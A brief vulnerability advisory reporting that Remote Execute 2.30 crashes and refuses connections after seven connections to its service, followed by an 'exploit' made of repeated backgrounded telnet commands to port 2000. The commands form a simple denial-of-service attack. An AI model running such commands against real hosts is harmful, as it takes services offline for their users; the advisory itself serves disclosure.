Background
-------------
Remote Execute 2.30 is vulnerable to an open connection attack, where
after seven connections are created to the client service it will crash
and refuse any further connections.

Exploit:
-------------
Really no need for PoC code here, the exploit is very simple.

telnet remotehost 2000 &
telnet remotehost 2000 &
